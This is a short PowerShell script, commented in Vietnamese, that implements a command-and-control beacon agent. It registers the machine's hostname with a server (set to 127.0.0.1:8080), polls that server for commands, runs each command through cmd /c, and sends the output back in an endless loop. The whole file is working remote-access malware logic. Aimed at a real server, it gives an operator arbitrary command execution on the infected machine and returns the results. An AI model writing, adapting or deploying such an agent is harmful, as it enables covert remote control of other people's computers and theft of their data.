# --- CẤU HÌNH ---
$server_url = "http://127.0.0.1:8080"
$agent_id = $null
$sleep_time = 3 # Thời gian ngủ giữa các lần hỏi (giây)

# --- HÀM CHỨC NĂNG ---

function Register-Agent {
    $hostname = $env:COMPUTERNAME
    try {
        $response = Invoke-RestMethod -Uri "$server_url/reg" -Method POST -Body @{name=$hostname}
        return $response
    } catch { return $null }
}

function Get-Task {
    try {
        # Hỏi server xem có task không
        $task = Invoke-RestMethod -Uri "$server_url/tasks/$agent_id" -Method GET
        return $task
    } catch { return $null }
}

function Send-Result ($output) {
    try {
        # Gửi kết quả về
        Invoke-RestMethod -Uri "$server_url/results/$agent_id" -Method POST -Body @{result=$output}
    } catch {}
}

# --- MAIN LOOP ---

Write-Host "[*] Starting Agent..."
$agent_id = Register-Agent

if (-not $agent_id) {
    Write-Host "[-] Could not register. Exiting."
    Exit
}

Write-Host "[+] Registered ID: $agent_id. Entering Beacon mode..."

while ($true) {
    # 1. Hỏi lệnh (Polling)
    $task = Get-Task
    
    if (-not [string]::IsNullOrEmpty($task)) {
        Write-Host "[*] Executing: $task"
        
        # 2. Thực thi lệnh
        # Dùng cmd /c để chạy lệnh hệ thống cơ bản
        $result = ""
        try {
            $result = cmd /c $task 2>&1 | Out-String
        } catch {
            $result = "Execution Error: $_"
        }
        
        # 3. Gửi kết quả
        Send-Result -output $result
    }
    
    # 4. Ngủ (Sleep)
    Start-Sleep -Seconds $sleep_time
}